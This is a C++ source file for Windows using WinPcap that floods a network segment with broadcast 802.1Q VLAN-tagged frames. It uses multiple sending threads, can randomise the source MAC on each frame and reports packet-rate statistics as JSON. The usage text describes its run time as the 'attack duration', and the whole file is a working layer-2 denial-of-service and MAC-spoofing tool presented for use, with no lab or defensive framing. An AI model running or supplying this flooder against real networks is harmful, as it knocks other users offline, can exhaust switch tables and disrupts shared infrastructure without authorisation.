// g++ -g <name>.cpp -o <name>.exe -I"./Include" -L"./Lib/x64" -lwpcap -lws2_32 -liphlpapi
#define HAVE_REMOTE
#include <pcap.h>
#include <iostream>
#include <vector>
#include <thread>
#include <atomic>
#include <chrono>
#include <cstring>
#include <cstdint>
#include <cstdlib>
#include <ctime>
#include <winsock2.h>
#include <iphlpapi.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

#pragma pack(push, 1)
struct ether_header {
    uint8_t  dst_mac[6];
    uint8_t  src_mac[6];
    uint16_t ethertype;
};

struct vlan_tag {
    uint16_t tci;
    uint16_t type;
};

struct vlan_frame {
    ether_header eth;
    vlan_tag     vlan;
    uint8_t      payload[42]; // минимальный кадр 64 байта
};
#pragma pack(pop)

std::atomic<bool> running(true);
std::atomic<uint64_t> total_packets(0);
std::string interface_name;

// ==================== Вспомогательные функции ====================
bool get_local_mac(const std::string& ifname, uint8_t mac[6]) {
    DWORD dwSize = 0;
    PIP_ADAPTER_INFO pAdapterInfo = nullptr;
    if (GetAdaptersInfo(nullptr, &dwSize) == ERROR_BUFFER_OVERFLOW) {
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(dwSize);
        if (GetAdaptersInfo(pAdapterInfo, &dwSize) == NO_ERROR) {
            PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
            while (pAdapter) {
                // Сравниваем по имени адаптера (часто GUID содержится в имени)
                if (ifname.find(pAdapter->AdapterName) != std::string::npos ||
                    ifname.find(pAdapter->Description) != std::string::npos) {
                    memcpy(mac, pAdapter->Address, 6);
                    free(pAdapterInfo);
                    return true;
                }
                pAdapter = pAdapter->Next;
            }
        }
        free(pAdapterInfo);
    }
    // Если не нашли, возвращаем нули (будет ошибка)
    memset(mac, 0, 6);
    return false;
}

void generate_random_mac(uint8_t* mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = rand() % 256;
    }
    mac[0] = (mac[0] & 0xFE) | 0x02; // unicast, locally administered
}

bool parse_mac(const char* str, uint8_t* mac) {
    unsigned int tmp[6] = {};
    int consumed = 0;
    if (sscanf(str, "%2x:%2x:%2x:%2x:%2x:%2x%n",
               &tmp[0], &tmp[1], &tmp[2], &tmp[3], &tmp[4], &tmp[5], &consumed) != 6) {
        return false;
    }
    if (str[consumed] != '\0') {
        return false;
    }
    for (int i = 0; i < 6; ++i) {
        mac[i] = static_cast<uint8_t>(tmp[i]);
    }
    return true;
}

// ==================== Поток отправки ====================
void send_flood(pcap_t* handle, int vlan_id, int thread_id, int packet_size,
                bool random_mac, uint8_t fixed_src_mac[6]) {
    std::vector<uint8_t> packet_buffer(packet_size);
    vlan_frame* frame = reinterpret_cast<vlan_frame*>(packet_buffer.data());
    uint64_t thread_packets = 0;

    // Заполняем статические поля
    memset(frame->eth.dst_mac, 0xFF, 6); // broadcast
    frame->eth.ethertype = htons(0x8100); // 802.1Q
    frame->vlan.tci = htons(vlan_id & 0xFFF);
    frame->vlan.type = htons(0x0800); // IPv4 (не важно)
    memset(frame->payload, thread_id, packet_size - sizeof(vlan_frame));

    uint8_t src_mac[6];
    if (!random_mac) {
        memcpy(src_mac, fixed_src_mac, 6);
    }

    while (running.load(std::memory_order_relaxed)) {
        if (random_mac) {
            generate_random_mac(src_mac);
        }
        memcpy(frame->eth.src_mac, src_mac, 6);

        if (pcap_sendpacket(handle, packet_buffer.data(), packet_size) == 0) {
            thread_packets++;
            total_packets.fetch_add(1, std::memory_order_relaxed);
        }
    }
}

// ==================== Поток статистики ====================
void stats_thread_func(std::chrono::steady_clock::time_point start_time, int duration) {
    uint64_t last_packets = 0;
    int elapsed_sec = 0;

    while (running.load(std::memory_order_relaxed)) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        auto now = std::chrono::steady_clock::now();
        elapsed_sec = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();
        uint64_t current_packets = total_packets.load(std::memory_order_relaxed);

        uint64_t pps = current_packets - last_packets;
        last_packets = current_packets;

        // Выводим JSON-строку со статистикой
        std::cout << "{\"type\":\"stats\",\"packets\":" << current_packets
                  << ",\"pps\":" << pps
                  << ",\"time\":" << elapsed_sec << "}" << std::endl;

        if (duration > 0 && elapsed_sec >= duration) {
            running = false;
            break;
        }
    }
}

// ==================== Главная функция ====================
int main(int argc, char* argv[]) {
    if (argc < 5) {
        std::cerr << "Usage: " << argv[0]
                  << " <interface> <vlan_id> <threads> <duration_sec> [--random-mac] [--src-mac xx:xx:xx:xx:xx:xx]\n"
                  << "  interface   - network interface name (e.g., \\\\Device\\\\NPF_{...})\n"
                  << "  vlan_id     - VLAN ID (1-4094)\n"
                  << "  threads     - number of threads\n"
                  << "  duration_sec- attack duration in seconds (0 for infinite)\n"
                  << "  --random-mac- generate random source MAC for each frame\n"
                  << "  --src-mac   - fixed source MAC (ignored if --random-mac set)\n"
                  << "Example: " << argv[0] << " \\\\Device\\\\NPF_{...} 100 4 60 --random-mac\n";
        return 1;
    }

    // Парсинг аргументов
    interface_name = argv[1];
    int vlan_id = atoi(argv[2]);
    int num_threads = atoi(argv[3]);
    int duration = atoi(argv[4]);

    if (vlan_id < 1 || vlan_id > 4094) {
        std::cerr << "VLAN ID must be between 1 and 4094.\n";
        return 1;
    }
    if (num_threads < 1) num_threads = 1;
    if (duration < 0) duration = 0;

    bool random_mac = false;
    uint8_t fixed_src_mac[6] = {0};
    bool fixed_mac_provided = false;

    for (int i = 5; i < argc; ++i) {
        if (strcmp(argv[i], "--random-mac") == 0) {
            random_mac = true;
        } else if (strcmp(argv[i], "--src-mac") == 0) {
            if (i + 1 >= argc) {
                std::cerr << "Missing value for --src-mac\n";
                return 1;
            }
            if (parse_mac(argv[++i], fixed_src_mac)) {
                fixed_mac_provided = true;
            } else {
                std::cerr << "Invalid MAC address format. Use xx:xx:xx:xx:xx:xx\n";
                return 1;
            }
        } else {
            std::cerr << "Warning: unknown argument '" << argv[i] << "'\n";
        }
    }

    // Инициализация Winsock (не обязательно для pcap, но оставим)
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed\n";
        return 1;
    }

    srand(static_cast<unsigned>(time(nullptr)));

    // Открытие интерфейса
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open(interface_name.c_str(), 65536, PCAP_OPENFLAG_MAX_RESPONSIVENESS,
                                1000, nullptr, errbuf);
    if (!handle) {
        std::cerr << "pcap_open failed: " << errbuf << std::endl;
        WSACleanup();
        return 1;
    }

    if (pcap_datalink(handle) != DLT_EN10MB) {
        std::cout << "Warning: Interface is not Ethernet. VLAN flooding may not work.\n";
    }

    // Получаем реальный MAC интерфейса, если нужен фиксированный, но не задан
    if (!random_mac && !fixed_mac_provided) {
        if (!get_local_mac(interface_name, fixed_src_mac)) {
            std::cerr << "Could not get local MAC for interface " << interface_name
                      << ". Using broadcast MAC as source (may cause issues).\n";
            memset(fixed_src_mac, 0xFF, 6);
        }
    }

   // std::cout << "=== Attack parameters ===" << std::endl;
   // std::cout << "Interface: " << interface_name << std::endl;
   // std::cout << "VLAN ID: " << vlan_id << std::endl;
   // std::cout << "Threads: " << num_threads << std::endl;
   // std::cout << "Duration: " << (duration ? std::to_string(duration) + " sec" : "infinite") << std::endl;
   // std::cout << "Source MAC: " << (random_mac ? "random per frame" : (fixed_mac_provided ? "fixed (provided)" : "fixed (interface)")) << std::endl;

    // Создаём отдельные pcap_t для каждого потока (избегаем блокировок)
    std::vector<pcap_t*> handles;
    for (int i = 0; i < num_threads; ++i) {
        pcap_t* h = pcap_open(interface_name.c_str(), 65536, PCAP_OPENFLAG_MAX_RESPONSIVENESS,
                               1000, nullptr, errbuf);
        if (!h) {
            std::cerr << "Failed to open interface for thread " << i << ": " << errbuf << std::endl;
            for (auto hh : handles) pcap_close(hh);
            pcap_close(handle);
            WSACleanup();
            return 1;
        }
        handles.push_back(h);
    }
    pcap_close(handle); // закрываем временный

    // Размер пакета фиксирован (минимальный Ethernet-кадр с VLAN = 64 байта)
    int packet_size = sizeof(vlan_frame); // 64

    // Запуск потоков
    std::vector<std::thread> workers;
    total_packets = 0;
    running = true;

    auto start_time = std::chrono::steady_clock::now();

    for (int t = 0; t < num_threads; ++t) {
        workers.emplace_back(send_flood, handles[t], vlan_id, t + 1, packet_size,
                             random_mac, fixed_src_mac);
    }

    // Поток статистики
    std::thread stats_thread(stats_thread_func, start_time, duration);

    // Если длительность 0 (бесконечный режим), ждём Enter
    if (duration == 0) {
        std::cout << "Press Enter to stop...\n";
        std::cin.get();
        running = false;
    }

    // Ожидаем завершения
    for (auto& t : workers) {
        if (t.joinable()) t.join();
    }
    if (stats_thread.joinable()) stats_thread.join();

    auto end_time = std::chrono::steady_clock::now();
    auto elapsed_ms = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time).count();
    uint64_t total = total_packets.load();

    // Итоговая статистика (не JSON)
    std::cout << "\n--- Results ---\n";
    std::cout << "Total packets sent: " << total << "\n";
    std::cout << "Duration: " << elapsed_ms << " ms\n";
    if (elapsed_ms > 0) {
        double pps = total * 1000.0 / elapsed_ms;
        double mbps = (pps * packet_size * 8) / 1'000'000;
        std::cout << "Throughput: " << pps << " pps\n";
        std::cout << "Bandwidth: " << mbps << " Mbps\n";
    }

    for (auto h : handles) pcap_close(h);
    WSACleanup();
    return 0;
}
